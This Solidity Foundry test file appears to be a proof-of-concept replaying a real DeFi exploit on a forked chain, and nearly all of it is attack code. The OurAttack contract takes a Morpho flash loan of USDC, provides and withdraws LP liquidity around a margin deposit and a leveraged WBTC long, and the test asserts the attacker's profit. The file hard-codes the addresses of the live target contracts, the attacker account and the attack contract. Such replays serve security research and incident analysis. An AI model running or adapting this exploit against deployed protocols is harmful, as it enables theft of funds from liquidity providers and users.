
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 391402007;
    uint256 constant TX_TIMESTAMP = 1760934747;
    uint256 constant TX_BLOCK_NUMBER = 391402008;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.MAT, "MAT", 1);
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDC, "USDC", 999999);
    }
}

contract OurAttack {
    function attack() external payable {
        executeAttackFlow();
    }

    function acceptNftCallback() internal {
        _replayDone[REPLAY_CALLBACK_1] = true;
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_2] = true;
        openMarginAcct();
        approveProtocolUse();
        provideLp();
        marginDeposit();
        openLong();
        withdrawLp();
        approveMorpho();
    }

    function openMarginAcct() internal {
        uint256 createdAccountId = IMAT(Addresses.MAT).createMarginAccount();
        createdAccountId;


    }

    function approveProtocolUse() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.MarginTradingRouter, 2200000000);
        IERC20Like(Addresses.USDC).approve(Addresses.SF_LP_USDC, 40000000000);
    }

    function provideLp() internal {
        ISF_LP_USDC(Addresses.SF_LP_USDC).provide(40000000000);
    }

    function marginDeposit() internal {
        uint256 marginAccountId = 18;
        IMarginTradingRouter(Addresses.MarginTradingRouter)
            .provideERC20(marginAccountId, Addresses.USDC, 2200000000);
    }

    function openLong() internal {
        uint256 marginAccountId = 18;
        ITradeRouter(Addresses.TradeRouter).increaseLongPosition(marginAccountId, Addresses.WBTC, 36200000);
    }

    function withdrawLp() internal {
        uint256 lpBalance = IERC20Like(Addresses.SF_LP_USDC).balanceOf(address(this));
        ISF_LP_USDC(Addresses.SF_LP_USDC).withdraw(lpBalance);
    }

    function approveMorpho() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.Morpho, type(uint256).max);
    }

    function executeAttackFlow() internal {
        pullSeedUsdc();
        startFlashLoan();
    }

    function pullSeedUsdc() internal {
        IERC20Like(Addresses.USDC).transferFrom(Addresses.attacker_eoa, address(this), 2201000000);


    }

    function startFlashLoan() internal {
        bytes memory callbackData = hex"";
        IMorpho(Addresses.Morpho).flashLoan(Addresses.USDC, 40000000000, callbackData);
    }

    receive() external payable {}

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata callbackData)
        external
        payable
        returns (bytes4)
    {
        operator;
        from;
        tokenId;
        callbackData;
        if (!_replayDone[REPLAY_CALLBACK_1]) acceptNftCallback();
        return this.onERC721Received.selector;
    }

    function onMorphoFlashLoan(uint256 borrowedAmount, bytes calldata callbackData) external payable {
        borrowedAmount;
        callbackData;
        if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == DIRECT_ENTRY) executeAttackFlow();
    }

    bytes4 private constant DIRECT_ENTRY = bytes4(keccak256("fuck()"));
    bytes32 private constant REPLAY_CALLBACK_1 = keccak256("poc.replay.REPLAY_CALLBACK_1");
    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    mapping(bytes32 => bool) private _replayDone;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant TradeRouterEventsStorage = 0x003356Ff3ebf345640CFc6f1aA0fd5708b4b2a7A;
    address internal constant SF_LP_USDC = 0x02434cD23972C82FbAbf610D157b41bFB45A45a3;
    address internal constant UniswapV3Pool = 0x0E4831319A50228B9e450861297aB92dee15B44F;
    address internal constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address internal constant MarginTradingRouter = 0x35CB6a3b4963DaE3CB7465c954DDFBE0cd13eb2b;
    address internal constant StandardArbERC20 = 0x3f770Ac673856F105b586bb393d122721265aD46;
    address internal constant OneClickEphemeralSwapOutput = 0x498e25cdEf28CEA358134a000d420E034513c4F8;
    address internal constant MarginAccount = 0x5c479762C8Fe57B6D874893a4B4932B40F612580;
    address internal constant USDCeph = 0x6696E9e81491364b5E0027Ed045608493072ef87;
    address internal constant Morpho = 0x6c247b1F6182318877311737BaC0844bAa518F5e;
    address internal constant OneClickProxy = 0x742b9169EC4a0fF96AEB37932a8eD5a8546f17c7;
    address internal constant MAT = 0x7E859C254F431e566DaaB65f49b2449Aa826E395;
    address internal constant A_805EAB_FD22 = 0x805EAb2230124b5bCEf3ad1aBf3DE5417791Fd22;
    address internal constant FiatTokenV2_2 = 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3;
    address internal constant PositionsStorage = 0x8a22312d652460BEe10077474De2C97f9634e98c;
    address internal constant FacadeOutput = 0xA7e66e3AB60A4Eb52B44d89D697A0C90143660fd;
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant Quoter = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xD356c82e0C85E1568641D084DbDAF76B8Df96c08;
    address internal constant TradeRouter = 0xd3fdE5AF30DA1F394d6e0D361B552648D0dff797;
    address internal constant MarginTrading = 0xd50Dffb8a9997D1651F3AB67e55a394C81170137;
    address internal constant attack_contract = 0xd9ff21caEEEa4329133c98A892db16b42f9BaA25;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IMAT {
    function createMarginAccount() external returns (uint256);
}

interface IMarginTradingRouter {
    function provideERC20(uint256, address, uint256) external;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ISF_LP_USDC {
    function provide(uint256) external;
    function withdraw(uint256) external;
}

interface ITradeRouter {
    function increaseLongPosition(uint256, address, uint256) external;
}
